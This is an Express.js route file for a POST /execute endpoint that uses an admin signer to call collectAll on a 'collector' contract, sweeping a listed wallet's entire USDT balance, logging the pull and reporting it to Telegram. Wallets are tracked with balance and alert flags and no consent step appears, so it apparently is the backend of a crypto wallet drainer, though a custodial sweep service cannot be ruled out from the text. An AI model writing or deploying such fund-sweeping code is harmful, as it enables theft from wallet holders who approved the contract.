import express from "express";
import { pool } from "../db.js";
import { adminWallet } from "../signer.js";
import { collectorContractWithSigner, getBalance } from "../usdtService.js";
import { sendPullSuccess, sendError } from "../telegramService.js";

const router = express.Router();

// Body: { wallet: '0x..' }
router.post("/execute", async (req, res) => {
  try {
    const { wallet } = req.body;
    if (!wallet) return res.status(400).json({ error: "wallet required" });

    // confirm wallet present in DB
    const r = await pool.query("SELECT address FROM wallets WHERE address=$1", [wallet]);
    if (r.rowCount === 0) return res.status(404).json({ error: "wallet not found" });

    // read balance
    const balBn = await getBalance(wallet);
    if (balBn <= 0n) return res.status(400).json({ error: "no balance" });

    const contract = collectorContractWithSigner(adminWallet);
    const txResp = await contract.collectAll(wallet);
    const receipt = await txResp.wait();

    // record in DB
    await pool.query(
      "INSERT INTO pull_logs (wallet, amount, tx_hash) VALUES ($1,$2,$3)",
      [wallet, balBn.toString(), receipt.transactionHash]
    );
    // update wallet last_balance
    await pool.query("UPDATE wallets SET last_balance = 0, alert_pending = false WHERE address = $1", [wallet]);

    // notify telegram
    await sendPullSuccess(wallet, balBn.toString(), receipt.transactionHash);

    res.json({ ok: true, tx: receipt.transactionHash });
  } catch (err) {
    console.error(err);
    await sendError(err.message);
    res.status(500).json({ error: err.message });
  }
});

export default router;
